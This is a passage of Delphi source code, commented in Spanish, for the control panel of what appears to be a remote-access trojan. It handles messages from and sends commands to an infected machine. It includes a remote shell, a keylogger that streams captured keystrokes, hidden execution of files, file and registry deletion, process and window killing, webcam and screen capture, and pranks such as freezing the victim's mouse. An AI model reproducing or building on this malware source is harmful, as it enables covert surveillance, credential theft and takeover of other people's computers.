      for i := 0 to ListViewArchivos.Items.Count - 1 do
      begin
        if ListViewArchivos.Items[i].ImageIndex = 3 then
          a := a + 1;
      end;
      LabelNumeroDeCarpetas.Caption := 'Carpetas: ' + IntToStr(a);
      //Aquí cuenta los archivos para decir cuantos son
      a := 0;
      for i := 0 to ListViewArchivos.Items.Count - 1 do
      begin
        if (ListViewArchivos.Items[i].ImageIndex <> 3) then //si no es una carpeta...
          a := a + 1;
      end;
      LabelNumeroDeArchivos.Caption := 'Archivos: ' + IntToStr(a);
    end;
    ListViewArchivos.Items.EndUpdate;
    StatusBar.Panels[1].Text := 'Archivos listados.';
    BtnActualizarArchivos.enabled := true;
  end;

  if Copy(Recibido, 1, 9) = 'GETFOLDER' then
  begin
    Delete(Recibido, 1, 9);
    while pos('|', Recibido) > 0 do
    begin
       Tempstr := Copy(Recibido, 1, Pos('|', Recibido) - 1);
       Delete(Recibido, 1, Pos('|', Recibido));
       agregardescargaencola(TempStr, strtointdef(Copy(Recibido, 1, Pos('|', Recibido) - 1),0));
       Delete(Recibido, 1, Pos('|', Recibido));
    end;
  end;

  if Copy(Recibido, 1, 12) = 'LISTARCLAVES' then
  begin
    Delete(Recibido, 1, 13);
   { if Pos('|', Recibido) > 1 then
    begin
      TempStr := Copy(recibido, 1, Pos('|', Recibido) - 1);
      Delete(Recibido, 1, Pos('|', Recibido));
    end;       }
   { while length(Recibido) < StrToInt(TempStr) do
    begin
      Recibido := Recibido + Trim(Athread.Connection.ReadLn);
    end;     }
    AniadirClavesARegistro(Recibido);
  end;
  if Copy(Recibido, 1, 13) = 'LISTARVALORES' then
  begin
    Delete(Recibido, 1, 14);
    AniadirValoresARegistro(Recibido);
    Recibido := '';
    BtnVerRegisto.enabled := true;
  end;
  if Copy(Recibido, 1, 13) = 'LISTARWEBCAMS' then
  begin
    Delete(Recibido, 1, 14);
    ComboBoxWebcam.Items.Clear;
    while Pos('|', Recibido) > 1 do
    begin
      ComboBoxWebcam.Items.Add(Copy(Recibido, 1, Pos('|', Recibido) - 1));
      Delete(Recibido, 1, Pos('|', Recibido));
    end;
    StatusBar.Panels[1].Text := 'Webcams listadas.';
  end;

  if Pos('SHELL|', Recibido) = 1 then
  begin
    Delete(Recibido, 1, 6);
    if Recibido = 'ACTIVAR' then
    begin
      MemoShell.Color      := ClBlack;
      MemoShell.Font.Color := ClWhite;
      ComboBoxShellCommand.Color := ClBlack;
      ComboBoxshellCommand.Font.Color := clWhite;
      ComboBoxShellCommand.Enabled := True;
      btnCambiarColorShell.Enabled := True;
      btnCambiarFuenteShell.Enabled := True;
    end
    else
    if Recibido = 'DESACTIVAR' then
    begin
      MemoShell.Color      := ClInactiveBorder;
      MemoShell.Font.Color := clWhite;
      ComboBoxShellCommand.Color := ClInactiveBorder;
      ComboBoxshellCommand.Font.Color := clWhite;
      ComboBoxShellCommand.Enabled := False;
      btnCambiarColorShell.Enabled := False;
      btnCambiarFuenteShell.Enabled := False;
    end
    else
    begin
     { TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1);
      Delete(Recibido, 1, Pos('|', Recibido));       }
{       while Length(Recibido) < StrToInt(TempStr) do
        begin
//          Aux := Athread.Connection.ReadLn;
          If Pos('SHELL|', Aux) = 1 then Delete(Aux, 1, 6);
          Recibido := Recibido + #13#10 + Athread.Connection.ReadLn; //Aux;
        end;}
     TempStr := StringReplace(Trim(Recibido),'|salto|', #10, [rfReplaceAll]);
     TempStr := StringReplace((Tempstr),'|salto2|', #13, [rfReplaceAll]);

    {  Recibido := Recibido + #13#10;
      while Length(Recibido) < StrToInt(Tempstr) do
        Recibido := Recibido + Athread.Connection.ReadChar;    }

      MemoShell.Text := MemoShell.Text + Trim(Tempstr) + #13#10;
      //Hace que el memo scrollee hasta abajo
      SendMessage(MemoShell.Handle, EM_LINESCROLL, 0, length(TempStr));
    end;
  end;

  if Copy(Recibido, 1, 12) = 'SERVICIOSWIN' then
  begin
    Delete(Recibido, 1, 14); //es 14 porque los datos recibidos se inicia con un /
    // ejemplo : /alerter/alvg*..
    while pos('|', Recibido) > 0 do
    begin
      Item := listviewservicios.Items.Add;
      Item.Caption := Copy(Recibido, 1, Pos('|', Recibido) - 1);
      Delete(Recibido, 1, Pos('|', Recibido));
      Item.SubItems.Add(Copy(Recibido, 1, Pos('|', Recibido) - 1));
      Delete(Recibido, 1, Pos('|', Recibido));
      Item.SubItems.Add(copy(recibido, 1, pos('|', Recibido) - 1));
      if(copy(recibido, 1, pos('|', Recibido) - 1) = 'Parado') then
        item.ImageIndex := 69
      else
      if(copy(recibido, 1, pos('|', Recibido) - 1) = 'Corriendo') then
        item.ImageIndex := 71
      else
      if(copy(recibido, 1, pos('|', Recibido) - 1) = 'pausado') then
        item.ImageIndex := 70
      else
        item.ImageIndex := 45;
      Delete(Recibido, 1, Pos('|', Recibido));
    end;
    BtnServicios.enabled := true;
  end;

   if Copy(Recibido, 1, 15) = 'ESTADOKEYLOGGER' then
  begin
    Delete(Recibido, 1, Pos('|', Recibido));
    if(copy(Recibido, 1, pos('|', Recibido) - 1) = 'ACTIVADO') then
    begin

      SpeedButtonRecibirLog.Enabled := true;
      SpeedButtonGuardarLog.Enabled := true;
      SpeedButtonEliminarLog.Enabled := true;
      ProgressBarKeylogger.Enabled := true;
      EditLogName.Enabled := false;
      SpeedButtonActivarKeylogger.caption := 'Desactivar Keylogger';
      SpeedButtonActivarKeylogger.enabled := true;
      CheckBoxOnlineKeylogger.enabled := true;
    end
    else
    begin
      SpeedButtonRecibirLog.Enabled := false;
      SpeedButtonGuardarLog.Enabled := false;
      SpeedButtonEliminarLog.Enabled := false;
      ProgressBarKeylogger.Enabled := false;
      EditLogName.Enabled := true;
      SpeedButtonActivarKeylogger.caption := 'Activar Keylogger';
      SpeedButtonActivarKeylogger.enabled := true;
      CheckBoxOnlineKeylogger.enabled := false;
    end;
    Delete(Recibido, 1, Pos('|', Recibido));
    if(copy(Recibido, 1, pos('|', Recibido) - 1)<>'') then
      EditLogName.Text := Extractfilename(copy(Recibido, 1, pos('|', Recibido) - 1));
  end;

  if Copy(Recibido, 1, 13) = 'NEWKEYLOGKEYS' then
  begin
    Delete(Recibido, 1, Pos('|', Recibido));
    Recibido := StringReplace((Recibido),'|salto|', #10, [rfReplaceAll]);
    Recibido := StringReplace((Recibido),'|salto2|', #13, [rfReplaceAll]);
    Recibido := StringReplace((Recibido),'|espacio|', ' ', [rfReplaceAll]); 
    RichEditKeylogger.SelStart := RichEditKeylogger.GetTextLen;
    
    while pos(#10, Recibido) > 0 do
    begin
      TempStr := copy(Recibido, 1, pos(#10, Recibido));
      Delete(Recibido, 1, Pos(#10, Recibido));
      
      if (Copy(TempStr, 1, 2) = '-[') then //evento
      begin
         RichEditKeylogger.SelAttributes.Style := [fsBold];
         RichEditKeylogger.SelAttributes.Color := clRed;
      end
      else if (Copy(TempStr, 1, 2) = '-{') then
      begin
         RichEditKeylogger.SelAttributes.Style := [fsBold];
         RichEditKeylogger.SelAttributes.Color := clgreen;
      end
      else
      begin
         RichEditKeylogger.SelAttributes.Style := [];
         RichEditKeylogger.SelAttributes.Color := clblack;
      end;
        RichEditKeylogger.SelText := TempStr {+ #13+#10};

    end;
    RichEditKeylogger.SelText := Recibido;
  end;

  if Copy(Recibido, 1, 14) = 'DATOSCAPSCREEN' then
  begin
    Delete(Recibido, 1, Pos('|', Recibido));
    AnchuraPantalla := strtoint(copy(Recibido, 1, pos('|', Recibido) - 1));
    Delete(Recibido, 1, Pos('|', Recibido));
    AlturaPantalla := strtoint(copy(Recibido, 1, pos('|', Recibido) - 1));
  end;

end;

function TFormControl.IconNum(strExt: string): integer;
var
  FileInfo : SHFILEINFO;
begin
 { if (strExt = '.mp3') or (strExt = '.wav') or (strExt = '.ogg') or
    (strExt = '.midi') or (strExt = '.mid') or (strExt = '.cda') then
    Result := 25
  else if (strExt = '.avi') or (strExt = '.mpg') or (strExt = '.mpeg') or
    (strExt = '.asf') or (strExt = '.wmv') or (strExt = '.mov') then
    Result := 25
  else if (strExt = '.jpg') or (strExt = '.jpeg') or (strExt = '.gif') or
    (strExt = '.png') or (strExt = '.pdf') then
    Result := 23
  else if (strExt = '.dll') or (strExt = '.sys') or (strExt = '.ocx') or
    (strExt = '.vxd') or (strExt = '.cpl') or (strExt = '.ini') then
    Result := 24
  else if (strExt = '.txt') then
    Result := 6
  else if (strExt = '.html') or (strExt = '.htm') or (strExt = '.php') then
    Result := 9
  else if (strExt = '.exe') or (strExt = '.com') or (strExt = '.scr') then
    Result := 3
  else if (strExt = '.bat') or (strExt = '.cmd') then
    Result := 10
  else if (strExt = '.zip') or (strExt = '.rar') or (strExt = '.ace') then
    Result := 11
  else if (strExt = '.doc') or (strExt = '.rtf') then
    Result := 12
  else if (strExt = '.ppt') or (strExt = '.pps') then
    Result := 13
  else if (strExt = '.xls') or (strExt = '.xml') then
    Result := 14
  else if (strExt = '.bmp') or (strExt = '.ico') then
    Result := 26
  else
    Result := 2;        }
  SHGetFileInfo(PChar(UpperCase(ExtractFileExt(strext))),
                    FILE_ATTRIBUTE_NORMAL,
                    FileInfo,
                    SizeOf(FileInfo),
                    SHGFI_ICON or SHGFI_SMALLICON or
                    SHGFI_SYSICONINDEX or SHGFI_USEFILEATTRIBUTES);
        Result := FileInfo.iIcon;  
end;

//Boton obtener información
procedure TFormControl.BtnRefrescarInformacionClick(Sender: TObject);
begin
  BtnRefrescarInformacion.Enabled := false;
  if Servidor.Connection.Connected then
    Servidor.Connection.Writeln('INFO')
  else
    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
end;

//Boton obtener procesos
procedure TFormControl.BtnRefrescarProcesosClick(Sender: TObject);
begin
  BtnRefrescarProcesos.Enabled := false;
  if Servidor.Connection.Connected then
    Servidor.Connection.Writeln('PROC')
  else
    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
end;

//Item del popupmenu para cerrar un proceso
procedure TFormControl.Cerrar1Click(Sender: TObject);
begin
 mslistviewitem := ListViewProcesos.Selected;

  if Servidor.Connection.Connected then
  begin
    if mslistviewitem = nil then
      MessageDlg('Selecciona algún proceso para matar', mtWarning, [mbOK], 0)
    else
    begin

      while Assigned(mslistviewitem) do
      begin
       Servidor.Connection.Writeln('KILLPROC|' + mslistviewitem.SubItems[0]);
       mslistviewitem := ListViewProcesos.GetNextItem(mslistviewitem, sdAll, [isSelected]);
      end;

    end
  end
  else
    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);

end;

//Boton obtener ventanas
procedure TFormControl.BtnRefrescarVentanasClick(Sender: TObject);
begin
   BtnRefrescarVentanas.Enabled := true;
  if Servidor.Connection.Connected then
  begin
    if(CheckBoxMostrarVentanasOcultas.Checked) then
      Servidor.Connection.Writeln('WIND|true')
    else
      Servidor.Connection.Writeln('WIND|false');
  end
  else
    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
end;

//Item del popupmenu para cerrar una ventana
procedure TFormControl.Cerrar2Click(Sender: TObject);
begin
  mslistviewitem := ListViewVentanas.Selected;

  if Servidor.Connection.Connected then
  begin
    if mslistviewitem = nil then
      MessageDlg('Selecciona alguna ventana', mtWarning, [mbOK], 0)
    else
    begin
      while Assigned(mslistviewitem) do
      begin
       Servidor.Connection.Writeln('CLOSEWIN|' + mslistviewitem.SubItems[0]);
       mslistviewitem := ListViewVentanas.GetNextItem(mslistviewitem, sdAll, [isSelected]);
      end;
      end;
  end
  else
    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
end;

//Item del popupmenu para maximizar una ventana
procedure TFormControl.Maximizar1Click(Sender: TObject);
begin
mslistviewitem := ListViewVentanas.Selected;

  if Servidor.Connection.Connected then
  begin
    if mslistviewitem = nil then
      MessageDlg('Selecciona alguna ventana', mtWarning, [mbOK], 0)
    else
    begin
      while Assigned(mslistviewitem) do
      begin
       Servidor.Connection.Writeln('MAXWIN|' + mslistviewitem.SubItems[0]);
       mslistviewitem := ListViewVentanas.GetNextItem(mslistviewitem, sdAll, [isSelected]);
      end;
      end;
  end
  else
    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);

end;

//Item del popupmenu para minimizar una ventana
procedure TFormControl.Minimizar1Click(Sender: TObject);
begin
mslistviewitem := ListViewVentanas.Selected;

  if Servidor.Connection.Connected then
  begin
    if mslistviewitem = nil then
      MessageDlg('Selecciona alguna ventana', mtWarning, [mbOK], 0)
    else
    begin
      while Assigned(mslistviewitem) do
      begin
       Servidor.Connection.Writeln('MINWIN|' + mslistviewitem.SubItems[0]);
       mslistviewitem := ListViewVentanas.GetNextItem(mslistviewitem, sdAll, [isSelected]);
      end;
      end;
  end
  else
    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
end;

//Item del popupmenu para mostrar una ventana
procedure TFormControl.Mostrar1Click(Sender: TObject);
begin
mslistviewitem := ListViewVentanas.Selected;

  if Servidor.Connection.Connected then
  begin
    if mslistviewitem = nil then
      MessageDlg('Selecciona alguna ventana', mtWarning, [mbOK], 0)
    else
    begin
      while Assigned(mslistviewitem) do
      begin
       Servidor.Connection.Writeln('SHOWWIN|' + mslistviewitem.SubItems[0]);
       mslistviewitem := ListViewVentanas.GetNextItem(mslistviewitem, sdAll, [isSelected]);
      end;
      end;
  end
  else
    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
end;

//Item del popupmenu para ocultar una ventana
procedure TFormControl.Ocultar1Click(Sender: TObject);
begin
mslistviewitem := ListViewVentanas.Selected;

  if Servidor.Connection.Connected then
  begin
    if mslistviewitem = nil then
      MessageDlg('Selecciona alguna ventana', mtWarning, [mbOK], 0)
    else
    begin
      while Assigned(mslistviewitem) do
      begin
       Servidor.Connection.Writeln('HIDEWIN|' + mslistviewitem.SubItems[0]);
       mslistviewitem := ListViewVentanas.GetNextItem(mslistviewitem, sdAll, [isSelected]);
      end;
      end;
  end
  else
    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
end;

//Item del popupmenu para minimizar todas las ventanas
procedure TFormControl.Minimizartodas1Click(Sender: TObject);
begin
  if Servidor.Connection.Connected then
    Servidor.Connection.Writeln('MINALLWIN')
  else
    MessageDlg('No estás conectado !', mtWarning, [mbOK], 0);
end;

//Activar Botón cerrar [X] de una ventana
procedure TFormControl.Activar1Click(Sender: TObject);
begin
mslistviewitem := ListViewVentanas.Selected;

  if Servidor.Connection.Connected then
  begin
    if mslistviewitem = nil then
      MessageDlg('Selecciona alguna ventana', mtWarning, [mbOK], 0)
    else
    begin
      while Assigned(mslistviewitem) do
      begin
       Servidor.Connection.Writeln('BOTONCERRAR|SI|' + mslistviewitem.SubItems[0]);
       mslistviewitem := ListViewVentanas.GetNextItem(mslistviewitem, sdAll, [isSelected]);
      end;
      end;
  end
  else
    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
end;

//Desactivar Botón cerrar [X] de una ventana
procedure TFormControl.Desactivar1Click(Sender: TObject);
begin
mslistviewitem := ListViewVentanas.Selected;

  if Servidor.Connection.Connected then
  begin
    if mslistviewitem = nil then
      MessageDlg('Selecciona alguna ventana', mtWarning, [mbOK], 0)
    else
    begin
      while Assigned(mslistviewitem) do
      begin
       Servidor.Connection.Writeln('BOTONCERRAR|NO|' + mslistviewitem.SubItems[0]);
       mslistviewitem := ListViewVentanas.GetNextItem(mslistviewitem, sdAll, [isSelected]);
      end;
      end;
  end
  else
    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
end;


procedure TFormControl.BtnEnviarBromasClick(Sender: TObject);
var
  broma: string;
begin
  if Servidor.Connection.Connected then
  begin
    if ListViewBromas.Selected = nil then
      MessageDlg('Selecciona alguna broma', mtWarning, [mbOK], 0)
    else
    begin
      case ListViewBromas.Selected.Index of //Selecciona la broma que se va a enviar
        0: Broma := 'MOUSETEMBLOROSO';
        1: Broma := 'CONGELARMOUSE';
        2: Broma := 'ABRIRCD';
        3: Broma := 'MATARBOTONINICIO';
      end;
      if ListViewBromas.Selected.SubItems[0] = 'Desactivado' then
      begin
        Servidor.Connection.Writeln(Broma + '|ACTIVAR');
        if Broma = 'MOUSETEMBLOROSO' then
          ListViewBromas.Items[1].SubItems[0] := 'Desactivado';
        // El mouse se descongela si se activa el congela mouse
        if Broma = 'CONGELARMOUSE' then
          ListViewBromas.Items[0].SubItems[0] := 'Desactivado';
        //El mouse para de temblar si se congela
      end
      else  //Si esta activada
        Servidor.Connection.Writeln(Broma + '|DESACTIVAR');
    end;
  end
  else
    MessageDlg('No estás conectado !', mtWarning, [mbOK], 0);
end;

//Funciones del FileManager
procedure TFormControl.BtnVerUnidadesClick(Sender: TObject);
begin
  BtnVerUnidades.Enabled := false;
  if Servidor.Connection.Connected then
    Servidor.Connection.Writeln('VERUNIDADES')
  else
    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
end;

procedure TFormControl.cmbUnidadesSelect(Sender: TObject);
begin
  if Servidor.Connection.Connected then
  begin
    Servidor.Connection.Writeln('LISTARARCHIVOS|' + Copy(cmbUnidades.Text, 1, 3));
    //Manda 'LISTARARCHIVOS|C:\'
    EditPathArchivos.Text := Copy(cmbUnidades.Text, 1, 3);
  end
  else
    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
end;

procedure TFormControl.ListViewArchivosDblClick(Sender: TObject);
begin

  if not Servidor.Connection.Connected then
  begin
    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
    Exit;
  end;

  if ListViewArchivos.Selected = nil then
    MessageDlg('Dale doble click a una carpeta o a un archivo!', mtWarning, [mbOK], 0)
  else
  begin
    StatusBar.Panels[1].Text := 'Listando archivos...';
    if ListViewArchivos.Selected.Caption = '<..>' then
    begin
      EditPathArchivos.Text :=
        Copy(EditPathArchivos.Text, 1, Length(EditPathArchivos.Text) - 1); //Borra el ultimo '\'
      EditPathArchivos.Text :=
        Copy(EditPathArchivos.Text, 1, LastDelimiter('\', EditPathArchivos.Text));
      Servidor.Connection.Writeln('LISTARARCHIVOS|' + EditPathArchivos.Text);
    end
    else if ListViewArchivos.Selected.ImageIndex = 3 then //doble-clickiò una carpeta
    begin
      ListViewArchivos.Selected.ImageIndex := 4;  //Icono de carpeta abierta
      EditPathArchivos.Text :=
        EditPathArchivos.Text + ListViewArchivos.Selected.Caption + '\';
      Servidor.Connection.Writeln('LISTARARCHIVOS|' + EditPathArchivos.Text);
    end
    else  //doble-clickiò un archivo
    begin
      //Tal vez escribir código para ejecutar...
    end;
  end;
end;

//Función que se ejecuta justo antes de mostrarse el popupmenu para habilitar o deshabilitar submenus
procedure TFormControl.ListViewArchivosContextPopup(Sender: TObject;
  MousePos: TPoint; var Handled: boolean);
var
  ext: string;
begin
  if ListViewArchivos.Selected <> nil then //Algún item seleccionado
  begin
    if (ListViewArchivos.Selected.ImageIndex = 3) then  //Es una carpeta
    begin
      PopupFileManager.Items[0].Enabled := True;  //Descargar!
      PopupFileManager.Items[1].Enabled := False;  //No Encolar Descarga
      PopupFileManager.Items[4].Enabled := False;  //No ejecutar
      PopupFileManager.Items[9].Enabled := False;  //No Previsualizar jpg
    end
    else  //Viceversa
    begin
      PopupFileManager.Items[0].Enabled := True;
      PopupFileManager.Items[1].Enabled := True;
      PopupFileManager.Items[4].Enabled := True;
      PopupFileManager.Items[9].Enabled := True;  //No Previsualizar jpg
    end;
    PopupFileManager.Items[5].Enabled := True;  //Eliminar
    PopupFileManager.Items[6].Enabled := True;  //Cambiar nombre
    PopupFileManager.Items[7].Enabled := True;  //Nueva carpeta
    ext := ExtractFileExt(ListViewArchivos.Selected.Caption);
    if (lowercase(ext) = '.jpg') or (lowercase(ext) = '.jpeg') then
    begin
      PopupFileManager.Items[9].Enabled := True; //Previsualizar jpg avanzado
    end;
  end
  else  //Si no se ha seleccionado ningún item
  begin
    PopupFileManager.Items[0].Enabled := False; //Deshabilitar Descargar
    PopupFileManager.Items[1].Enabled := False; //Deshabilitar Encolar Descarga
    PopupFileManager.Items[3].Enabled := False; //Deshabilitar Ejecutar
    PopupFileManager.Items[4].Enabled := False; //Deshabilitar Eliminar
    PopupFileManager.Items[5].Enabled := False; //Deshabilitar Cambiar nombre
    PopupFileManager.Items[6].Enabled := False; //Deshabilitar Cambiar nombre
    PopupFileManager.Items[9].Enabled := False; //Previsualizar jpg avanzado
    if EditPathArchivos.Text = '' then
      //Si no está en ningún Path deshabilitar crear carpeta
      PopupFileManager.Items[7].Enabled := False;
  end;

end;

procedure TFormControl.Normal1Click(Sender: TObject);
begin
  if Servidor.Connection.Connected then
  begin
    mslistviewitem := ListViewArchivos.Selected;
    while Assigned(mslistviewitem) do
    begin
    Servidor.Connection.Writeln('EXEC|NORMAL|' + EditPathArchivos.Text +
    mslistviewitem.Caption);
    mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected]);
    end;
  end
  else
    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
end;

procedure TFormControl.Oculto1Click(Sender: TObject);
begin
  if Servidor.Connection.Connected then
  begin
    mslistviewitem := ListViewArchivos.Selected;
    while Assigned(mslistviewitem) do
    begin
    Servidor.Connection.Writeln('EXEC|OCULTO|' + EditPathArchivos.Text +
    mslistviewitem.Caption);
    mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected]);
    end;
  end
  else
    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
end;

procedure TFormControl.EliminarClick(Sender: TObject);
begin
  if Servidor.Connection.Connected then
  begin
    mslistviewitem := ListViewArchivos.Selected;
    while Assigned(mslistviewitem) do
    begin
      if mslistviewitem.ImageIndex = 3 then
      begin
        if MessageDlg('¿Está seguro que quiere borrar la carpeta ' +
        mslistviewitem.Caption + '?', mtConfirmation, [mbYes, mbNo], 0) <> idNo then
        Servidor.Connection.Writeln('DELFOLDER|' + EditPathArchivos.Text +
          mslistviewitem.Caption);
      end
      else
      if MessageDlg('¿Está seguro que quiere borrar el archivo ' +
      mslistviewitem.Caption + '?', mtConfirmation, [mbYes, mbNo], 0) <> idNo then
      Servidor.Connection.Writeln('DELFILE|' + EditPathArchivos.Text +
        mslistviewitem.Caption);
      mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected]);
      end;
    btnactualizararchivos.Click;
  end
  else
    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
end;

procedure TFormControl.Cambiarnombre1Click(Sender: TObject);
begin
  //Se pone el cursor de edición sobre el caption del item
  ListViewArchivos.Selected.EditCaption;
end;


procedure TFormControl.ListViewDescargasCustomDrawSubItem(Sender: TCustomListView;  Item: TListItem; SubItem: integer; State: TCustomDrawState; var DefaultDraw: boolean);
var
  Descarga: TDescargaHandler;
begin
  //exit;
  if (item.data <> nil) then
  begin
  Descarga := TDescargaHandler(Item.Data);
  if Descarga.Finalizado then
  begin
    Sender.Canvas.Font.Color := clGreen;
    Sender.Canvas.Font.Style := [fsbold];
  end
  else if not Descarga.cancelado then
  begin
    Sender.Canvas.Font.Color := clBlack;
    Sender.Canvas.Font.Style := [];
  end
  else
  begin
    Sender.Canvas.Font.Color := clRed;
    Sender.Canvas.Font.Style := [fsbold];
  end;
  end;
end;
procedure TFormControl.ListViewArchivosEdited(Sender: TObject;
  Item: TListItem; var S: string);
begin
  if Servidor.Connection.Connected then
  begin
    if S = '' then
    begin
      S := Item.Caption;
      Exit;
    end;
    if (Pos('|', S) <> 0) or (Pos('*', S) <> 0) or (Pos('\', S) <> 0) or
      (Pos('/', S) <> 0) or (Pos(':', S) <> 0) or (Pos('?', S) <> 0) or
      (Pos('"', S) <> 0) or (Pos('<', S) <> 0) or (Pos('>', S) <> 0) then
    begin
      MessageDlg(
        'Nombre de carpeta inválido. Una carpeta no puede tener ninguno de los siguientes carácteres: */\?"<>|',
        mtError, [mbOK], 0);
      S := Item.Caption; //Así evitamos que se cambie el nombre en el ListView
    end
    else
      Servidor.Connection.Writeln('RENAME|' + EditPathArchivos.Text +
        ListViewArchivos.Selected.Caption + '|' + EditPathArchivos.Text + S);
  end
  else
    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
end;

procedure TFormControl.Crearnuevacarpeta1Click(Sender: TObject);
var
  DirName: string;
begin
  if Servidor.Connection.Connected then
  begin
    DirName := InputBox('Escriba el nombre para la nueva carpeta.',
      'Crear nueva carpeta', 'Nueva carpeta');
    if DirName <> '' then
    begin
      if DirName[Length(DirName)] <> '\' then
        DirName := DirName + '\';
      Servidor.Connection.Writeln('MKDIR|' + EditPathArchivos.Text + DirName);
    end;
    btnactualizararchivos.Click;
  end
  else
    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
end;

procedure TFormControl.BtnActualizarArchivosClick(Sender: TObject);
begin
  BtnActualizarArchivos.Enabled := false;
  if not Servidor.Connection.Connected then
  begin
    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
    Exit;
  end;

  if Length(EditPathArchivos.Text) < 3 then
  begin
    MessageDlg('No escribiste un directorio válido.', mtWarning, [mbOK], 0);
    exit;
  end;
  if EditPathArchivos.Text[Length(EditPathArchivos.Text)] <> '\' then
    EditPathArchivos.Text := EditPathArchivos.Text + '\';
  Servidor.Connection.Writeln('LISTARARCHIVOS|' + EditPathArchivos.Text);
end;

//Obtiene la ruta completa del arbol padre\hijo\nieto\ xD
function TFormControl.ObtenerRutaAbsolutaDeArbol(Nodo: TTreeNode): string;
begin
  repeat
    Result := Nodo.Text + '\' + Result;
    Nodo   := Nodo.Parent;
  until not Assigned(Nodo);
end;

procedure TFormControl.TreeViewRegeditChange(Sender: TObject; Node: TTreeNode);
begin

  if not Servidor.Connection.Connected then
  begin
    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
    Exit;
  end;

  if TreeViewRegedit.Selected <> nil then
  begin
    EditPathRegistro.Text := ObtenerRutaAbsolutaDeArbol(TreeViewRegedit.Selected);
    Servidor.Connection.Writeln('LISTARVALORES|' + EditPathRegistro.Text);
  end;
end;

procedure TFormControl.TreeViewRegeditDblClick(Sender: TObject);
begin
  if not Servidor.Connection.Connected then
  begin
    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
    Exit;
  end;

  Servidor.Connection.Writeln('LISTARCLAVES|' + EditPathRegistro.Text);
end;

//Lo hacemos en una función a parte para no saturar de código la función OnRead
procedure TFormControl.AniadirClavesARegistro(Claves: string);
var
  Nodo:  TTreeNode;
  Clave: string;
begin
  //Borramos los hijos que tenga, para no repetirnos en caso de pulsar dos veces
  //sobre una misma clave
  TreeViewRegedit.Selected.DeleteChildren;
  Claves := StringReplace(Claves,'|salto|', #10, [rfReplaceAll]);
  Claves := StringReplace(Claves,'|salto2|', #13, [rfReplaceAll]);
  while Pos('|', Claves) > 0 do
  begin
    Clave := Copy(Claves, 1, Pos('|', Claves) - 1);
    Nodo  := TreeViewRegedit.Items.AddChild(TreeViewRegedit.Selected, Clave);
    //Sin seleccionar mostrar el icono de carpeta cerrada
    Nodo.ImageIndex := 1;
    //Seleccionado mostrar el icono de carpeta abierta
    Nodo.SelectedIndex := 0;
    Delete(Claves, 1, Pos('|', Claves));
  end;
  TreeViewRegedit.Selected.Expand(False);
end;

procedure TFormControl.AniadirValoresARegistro(Valores: string);
var
  Item: TListItem;
  Tipo: string;
begin
  ListViewRegistro.Clear;

  Valores := StringReplace(Valores,'|salto|', #10, [rfReplaceAll]);
  Valores := StringReplace(Valores,'|salto2|', #13, [rfReplaceAll]);

  while Pos('|', Valores) > 0 do
  begin
    Item := ListViewRegistro.Items.Add;
    //Nombre
    Item.Caption := Copy(Valores, 1, Pos('|', Valores) - 1);
    Delete(Valores, 1, Pos('|', Valores));
    //Tipo
    Tipo := Copy(Valores, 1, Pos('|', Valores) - 1);

    if (Tipo = 'REG_BINARY') or (Tipo = 'REG_DWORD') then
      Item.ImageIndex := 16
    else
      Item.ImageIndex := 15;
    Item.SubItems.Add(Tipo);
    Delete(Valores, 1, Pos('|', Valores));
    //Datos
    Item.SubItems.Add(Copy(Valores, 1, Pos('|', Valores) - 1));
    Delete(Valores, 1, Pos('|', Valores));
  end;
end;

procedure TFormControl.BtnVerRegistoClick(Sender: TObject);
begin
  if EditPathRegistro.text = '' then exit;
  BtnVerRegisto.enabled := false;
  if Servidor.Connection.Connected then
    Servidor.Connection.Writeln('LISTARVALORES|' + EditPathRegistro.Text)
  else
    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
end;

procedure TFormControl.N1Click(Sender: TObject);
begin
  if Servidor.Connection.Connected then
  begin
    if PopupRegistro.PopupComponent.ClassType = TListView then
    begin
      if ListViewRegistro.Selected <> nil then
        //Pone el cursor para editar en el item
        ListViewRegistro.Selected.EditCaption;
    end;
  end
  else
    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
end;

//Una vez editado el valor le avisamos al server
procedure TFormControl.ListViewRegistroEdited(Sender: TObject;
  Item: TListItem; var S: string);
begin

  if not Servidor.Connection.Connected then
  begin
    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
    Exit;
  end;

  Servidor.Connection.Writeln('NEWNOMBREVALOR|' + EditPathRegistro.Text +
    '|' + Item.Caption + '|' + S);
end;

procedure TFormControl.Eliminar1Click(Sender: TObject);
begin
  if Servidor.Connection.Connected then
  begin
    if PopupRegistro.PopupComponent.ClassType = TListView then
    begin
      if MessageDlg('¿Está seguro de que quiere borrar el valor ' +
        ListViewRegistro.Selected.Caption + '?', mtConfirmation, [mbYes, mbNo], 0) <> idNo then
        Servidor.Connection.Writeln('BORRARREGISTRO|' + EditPathRegistro.Text +
          ListViewRegistro.Selected.Caption);
    end
    else
    if MessageDlg('¿Está seguro de que quiere borrar la clave ' +
      TreeViewRegedit.Selected.Text + '?', mtConfirmation, [mbYes, mbNo], 0) <> idNo then
